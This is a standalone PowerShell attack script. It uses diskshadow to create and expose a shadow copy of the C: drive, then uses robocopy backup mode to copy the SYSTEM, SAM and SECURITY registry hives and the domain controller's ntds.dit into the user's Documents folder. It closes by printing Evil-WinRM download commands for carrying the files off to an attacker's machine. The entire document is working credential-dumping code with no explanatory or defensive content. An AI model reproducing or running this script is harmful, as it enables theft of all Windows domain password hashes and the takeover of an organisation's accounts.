Write-Host @"
_____              .___       ___.             ________                    __                   
/     \ _____     __| _/____   \_ |__ ___.__.  /  _____/______ __ __  _____/  |_   _____ _______ 
/  \ /  \\__  \   / __ |/ __ \   | __ <   |  | /   \  __\_  __ \  |  \/    \   __\  \__  \\_  __ \
/    Y    \/ __ \_/ /_/ \  ___/   | \_\ \___  | \    \_\  \  | \/  |  /   |  \  |     / __ \|  | \/
/\____|__  (____  /\____ |\___  >  |___  / ____|  \______  /__|  |____/|___|  /__| /\ (____  /__|   
    \/     \/      \/    \/       \/\/              \/                 \/     \/      \/       
"@


# Get current user's Documents path
$userProfile = [Environment]::GetFolderPath("MyDocuments")

# Paths for output files and directories
$diskshadowFile = Join-Path $userProfile "diskshadow.txt"
$ntdsDir = Join-Path $userProfile "ntds"
$tempDir = $userProfile

Write-Host "[*] Creating diskshadow script at $diskshadowFile..."

# Create diskshadow script
$lines = @(
    'set verbose on',
    "set metadata C:\Windows\Temp\meta.cab",
    'set context clientaccessible',
    'set context persistent',
    'begin backup',
    'add volume C: alias cdrive',
    'create',
    'expose %cdrive% E:',
    'end backup'
)
[System.IO.File]::WriteAllLines($diskshadowFile, $lines)

Write-Host "[*] Executing diskshadow to create and expose volume shadow copy..."
diskshadow /s $diskshadowFile

Write-Host "[*] Copying SYSTEM hive from shadow copy..."
robocopy /B "E:\Windows\System32\Config" $tempDir SYSTEM | Out-Null

Write-Host "[*] Copying SAM hive from shadow copy..."
robocopy /B "E:\Windows\System32\Config" $tempDir SAM | Out-Null

Write-Host "[*] Copying SECURITY hive from shadow copy..."
robocopy /B "E:\Windows\System32\Config" $tempDir SECURITY | Out-Null

# Ensure NTDS directory exists
if (!(Test-Path $ntdsDir)) {
    Write-Host "[*] Creating directory $ntdsDir for NTDS.dit..."
    New-Item -Path $ntdsDir -ItemType Directory | Out-Null
}

Write-Host "[*] Copying ntds.dit from shadow copy..."
robocopy /B "E:\Windows\NTDS" $ntdsDir ntds.dit | Out-Null

Write-Host ""
Write-Host "[*] Done. The following files are now available:"
Write-Host "    - SYSTEM   -> $tempDir\SYSTEM"
Write-Host "    - SAM      -> $tempDir\SAM"
Write-Host "    - SECURITY -> $tempDir\SECURITY"
Write-Host "    - ntds.dit -> $ntdsDir\ntds.dit"
Write-Host ""
Write-Host "[*] You can now download them using Evil-WinRM."
Write-Host "    Example:"
Write-Host "        download SYSTEM"
Write-Host "        download SAM"
Write-Host "        download SECURITY"
Write-Host "        cd ntds"
Write-Host "        download ntds.dit"
